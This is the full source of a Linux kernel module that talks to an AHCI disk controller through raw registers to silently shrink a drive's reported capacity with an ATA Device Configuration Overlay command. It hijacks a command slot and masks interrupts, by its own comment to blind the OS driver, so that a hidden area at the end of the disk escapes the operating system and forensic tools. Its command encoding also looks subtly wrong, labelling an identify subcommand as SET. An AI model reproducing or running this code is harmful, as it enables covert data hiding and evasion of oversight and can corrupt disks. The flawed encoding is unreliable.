#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/mm.h>

/* ------------------------------------------------------------------ *
 *  AHCI MMIO base (BAR5 / ABAR) - Pure Bare-Metal Access
 * ------------------------------------------------------------------ */
#define AHCI_ABAR_PHYS    0xe1900000ULL
#define AHCI_PORT_NUM     0
#define AHCI_PORT_BASE    (0x100 + (AHCI_PORT_NUM) * 0x80)

/* Port register offsets */
#define AHCI_PxCLB        0x00
#define AHCI_PxCLBU       0x04
#define AHCI_PxIS         0x10
#define AHCI_PxIE         0x14
#define AHCI_PxCMD        0x18
#define AHCI_PxTFD        0x20
#define AHCI_PxSSTS       0x28
#define AHCI_PxSERR       0x30
#define AHCI_PxCI         0x38

#define PxIS_TFES         (1U << 30)

#define NATIVE_MAX_LBA    2097152ULL
#define TAIL_TRIM_SECTORS 1000ULL
#define STEALTH_MAX_LBA   (NATIVE_MAX_LBA - TAIL_TRIM_SECTORS)
#define TARGET_INSPECT_LBA (NATIVE_MAX_LBA - 1ULL)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Researcher");
MODULE_DESCRIPTION("Pure MMIO Stealth DCO Module with Detailed Diagnostic Prints");

struct sata_fis_h2d {
    u8 fis_type;
    u8 pm_port_c;
    u8 command;
    u8 feature_low;
    u8 lba0, lba1, lba2, device;
    u8 lba3, lba4, lba5, feature_high;
    u8 count_low, count_high, icc, control;
    u8 aux[4];
} __packed;

struct ahci_cmd_header {
    u32 dw0;
    u32 dw1;
    u32 ctba;
    u32 ctbau;
    u32 reserved[4];
} __packed;

struct ahci_prdt_entry {
    u32 dba;
    u32 dbau;
    u32 reserved;
    u32 dbc;
} __packed;

/* ------------------------------------------------------------------ *
 *  Helper: Robust slot execution with verbose status logging
 * ------------------------------------------------------------------ */
static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
{
    u32 ie_orig, ci_val, tfd_val, serr_val;
    int i, max_polls = is_dco_set ? 300 : 100;

    pr_info("[STEALTH_DCO] [+] Preparing slot %d execution (DCO Set: %s)\n", slot, is_dco_set ? "YES" : "NO");

    /* 1. Mask port interrupts to blind libata's ISR */
    ie_orig = readl((char *)port_base + AHCI_PxIE);
    pr_info("[STEALTH_DCO] [*] Original PxIE: 0x%08x -> Masking interrupts (PxIE = 0)\n", ie_orig);
    writel(0, (char *)port_base + AHCI_PxIE);
    wmb();

    /* 2. Fire command slot */
    ci_val = readl((char *)port_base + AHCI_PxCI);
    pr_info("[STEALTH_DCO] [*] Current PxCI before firing: 0x%08x\n", ci_val);
    ci_val |= (1U << slot);
    writel(ci_val, (char *)port_base + AHCI_PxCI);
    wmb();
    pr_info("[STEALTH_DCO] [+] Fired slot %d. New PxCI: 0x%08x\n", slot, readl((char *)port_base + AHCI_PxCI));

    /* 3. Poll manually for completion */
    for (i = 0; i < max_polls; i++) {
        u32 current_ci = readl((char *)port_base + AHCI_PxCI);
        tfd_val = readl((char *)port_base + AHCI_PxTFD);

        if (!(current_ci & (1U << slot)) || !(tfd_val & 0x88)) {
            pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x, PxCI: 0x%08x\n", 
                    slot, i, tfd_val, current_ci);

            /* Clear pending status flags */
            writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
            
            /* Log SERR status for diagnostics */
            serr_val = readl((char *)port_base + AHCI_PxSERR);
            pr_info("[STEALTH_DCO] [*] Port SERR status post-execution: 0x%08x\n", serr_val);

            /* Restore original interrupt mask */
            writel(ie_orig, (char *)port_base + AHCI_PxIE);
            wmb();
            pr_info("[STEALTH_DCO] [*] Restored original PxIE: 0x%08x\n", ie_orig);

            return 0;
        }
        msleep(10);
    }
    
    /* Cleanup on timeout */
    pr_err("[STEALTH_DCO] [-] ERROR: Slot %d timed out! PxTFD: 0x%08x, PxCI: 0x%08x\n", 
           slot, readl((char *)port_base + AHCI_PxTFD), readl((char *)port_base + AHCI_PxCI));
    
    writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
    writel(ie_orig, (char *)port_base + AHCI_PxIE);
    wmb();

    return -ETIMEDOUT;
}

/* ------------------------------------------------------------------ *
 *  Init
 * ------------------------------------------------------------------ */
static int __init ahci_stealth_dco_init(void)
{
    void __iomem *abar_base = NULL;
    void *port_base = NULL;
    void *ctba_virt = NULL;
    void *data_virt = NULL;

    struct sata_fis_h2d    *fis;
    struct ahci_cmd_header *hdr;
    struct ahci_prdt_entry *prdt;

    u64 ctba_phys = 0, data_phys = 0, lst_phys = 0;
    u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
    unsigned long ctba_page = 0, data_page = 0;
    int ret = 0;
    u8 *sector_buf;

    pr_info("[STEALTH_DCO] ==================================================\n");
    pr_info("[STEALTH_DCO] ---- PURE MMIO HARDWARE-MASKED DCO START ----\n");
    pr_info("[STEALTH_DCO] ==================================================\n");

    /* Map ABAR directly */
    abar_base = ioremap(AHCI_ABAR_PHYS, 0x1100);
    if (!abar_base) {
        pr_err("[STEALTH_DCO] FATAL: ioremap failed for ABAR 0x%llx\n", AHCI_ABAR_PHYS);
        return -ENOMEM;
    }
    port_base = (void *)((char *)abar_base + AHCI_PORT_BASE);
    pr_info("[STEALTH_DCO] [+] ABAR mapped at virt %p, Port %d base at %p\n", abar_base, AHCI_PORT_NUM, port_base);

    /* Read Link Status */
    ssts_val = readl((char *)port_base + AHCI_PxSSTS);
    pr_info("[STEALTH_DCO] [*] Port SStatus (PxSSTS): 0x%08x\n", ssts_val);

    clb_lo = readl((char *)port_base + AHCI_PxCLB);
    clb_hi = readl((char *)port_base + AHCI_PxCLBU);
    lst_phys = ((u64)clb_hi << 32) | clb_lo;
    pr_info("[STEALTH_DCO] [+] Command List Base (PxCLB/U): 0x%016llx\n", lst_phys);
    if (!lst_phys) {
        pr_err("[STEALTH_DCO] FATAL: PxCLB is 0, port uninitialized\n");
        ret = -ENODEV;
        goto out;
    }

    ctba_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
    data_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
    if (!ctba_page || !data_page) {
        pr_err("[STEALTH_DCO] FATAL: Failed to allocate DMA pages\n");
        ret = -ENOMEM;
        goto out;
    }
    ctba_virt = (void *)ctba_page;
    ctba_phys = (u64)virt_to_phys(ctba_virt);
    data_virt = (void *)data_page;
    data_phys = (u64)virt_to_phys(data_virt);
    pr_info("[STEALTH_DCO] [+] Allocated CTBA page: virt %p -> phys 0x%016llx\n", ctba_virt, ctba_phys);
    pr_info("[STEALTH_DCO] [+] Allocated DATA page: virt %p -> phys 0x%016llx\n", data_virt, data_phys);

    memset(ctba_virt, 0, PAGE_SIZE);
    memset(data_virt, 0, 512);

    cmd_val = readl((char *)port_base + AHCI_PxCMD);
    pr_info("[STEALTH_DCO] [*] Original PxCMD: 0x%08x -> Enabling ST (bit 0) and FRE (bit 4)\n", cmd_val);
    cmd_val |= (1U << 0) | (1U << 4);
    writel(cmd_val, (char *)port_base + AHCI_PxCMD);
    wmb();

    /* Phase 1: Inspect Tail Sector */
    pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0x25; /* READ DMA EXT */
    fis->lba0        = (u8)(TARGET_INSPECT_LBA & 0xFF);
    fis->lba1        = (u8)((TARGET_INSPECT_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((TARGET_INSPECT_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((TARGET_INSPECT_LBA >> 24) & 0xFF);
    fis->lba4        = (u8)((TARGET_INSPECT_LBA >> 32) & 0xFF);
    fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
    fis->count_low   = 0x01;

    prdt = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
    prdt->dba  = (u32)(data_phys & 0xFFFFFFFF);
    prdt->dbau = (u32)(data_phys >> 32);
    prdt->dbc  = (511 & 0x3FFFFF);

    {
        void *slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
        if (slot_virt) {
            hdr = (struct ahci_cmd_header *)slot_virt;
            hdr->dw0   = (5 & 0x1F) | (1 << 16); /* 5 DWs, Write=0 (Read) */
            hdr->dw1   = 0;
            hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
            hdr->ctbau = (u32)(ctba_phys >> 32);
            wmb();
            memunmap(slot_virt);
            pr_info("[STEALTH_DCO] [+] Configured Slot 31 command header for READ\n");
        } else {
            pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list\n");
            ret = -EFAULT;
            goto out;
        }
    }

    if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
        sector_buf = (u8 *)data_virt;
        if (*(u64 *)sector_buf == 0x5452415020494645ULL) {
            pr_warn("[STEALTH_DCO] [+] GPT Backup Header detected at tail boundary.\n");
        } else {
            pr_info("[STEALTH_DCO] [+] Tail sector verified successfully.\n");
        }
    } else {
        pr_err("[STEALTH_DCO] [-] Phase 1 inspection failed.\n");
        ret = -EIO;
        goto out;
    }

    /* Phase 2: DCO Micro-Trim */
    pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
    memset(ctba_virt, 0, 256);
    fis = (struct sata_fis_h2d *)ctba_virt;
    fis->fis_type    = 0x27;
    fis->pm_port_c   = 0x80;
    fis->command     = 0xB1; /* DEVICE CONFIGURATION */
    fis->feature_low = 0xC2; /* SET */
    fis->lba0        = (u8)(STEALTH_MAX_LBA & 0xFF);
    fis->lba1        = (u8)((STEALTH_MAX_LBA >> 8) & 0xFF);
    fis->lba2        = (u8)((STEALTH_MAX_LBA >> 16) & 0xFF);
    fis->device      = 0x40;
    fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
    fis->count_low   = 0x01;

    {
        void *slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
        if (slot_virt) {
            hdr = (struct ahci_cmd_header *)slot_virt;
            hdr->dw0   = (5 & 0x1F) | (0 << 16); /* 5 DWs, Write=0 */
            hdr->dw1   = 0;
            hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
            hdr->ctbau = (u32)(ctba_phys >> 32);
            wmb();
            memunmap(slot_virt);
            pr_info("[STEALTH_DCO] [+] Configured Slot 31 command header for DCO SET\n");
        } else {
            pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list (Phase 2)\n");
            ret = -EFAULT;
            goto out;
        }
    }

    if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
        pxis_after = readl((char *)port_base + AHCI_PxIS);
        pr_info("[STEALTH_DCO] [*] Post-DCO PxIS status register: 0x%08x\n", pxis_after);
        if (pxis_after & PxIS_TFES) {
            pr_err("[STEALTH_DCO] [-] Controller rejected DCO command (Task File Error Set).\n");
            ret = -EIO;
        } else {
            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied silently via hardware masking.\n");
        }
    } else {
        pr_err("[STEALTH_DCO] [-] Phase 2 DCO execution failed or timed out.\n");
        ret = -EIO;
    }

out:
    if (data_page) free_page(data_page);
    if (ctba_page) free_page(ctba_page);
    if (abar_base) iounmap(abar_base);
    pr_info("[STEALTH_DCO] ---- MODULE EXECUTION COMPLETE (ret=%d) ----\n", ret);
    return ret;
}

static void __exit ahci_stealth_dco_exit(void)
{
    pr_info("[STEALTH_DCO] ---- Module unloaded cleanly ----\n");
}

module_init(ahci_stealth_dco_init);
module_exit(ahci_stealth_dco_exit);